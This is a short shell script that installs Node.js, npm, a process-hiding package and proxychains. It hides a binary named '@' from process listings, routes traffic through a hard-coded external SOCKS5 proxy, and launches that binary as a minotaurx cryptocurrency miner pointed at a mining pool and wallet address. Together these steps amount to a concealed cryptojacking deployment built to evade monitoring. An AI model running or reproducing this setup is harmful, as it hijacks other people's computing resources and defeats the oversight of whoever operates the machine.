apt update 
apt install nodejs -y
node –version
apt install npm -y
npm –version 
npm i -g node-process-hider
chmod u+x @
chmod 777 proxychains
ph add @
apt install proxychains  -y 
sed -i 's/socks4/socks5/' /etc/proxychains.conf 
sed -i 's/127.0.0.1/98.162.96.53/' /etc/proxychains.conf
sed -i 's/9050/10663/' /etc/proxychains.conf
proxychains ./@ -a minotaurx  -o stratum+tcps://stratum-eu.rplant.xyz:17068 -u RFgqtpziL9u4qbC1EyafxgzTXE35mSrCgZ -t30
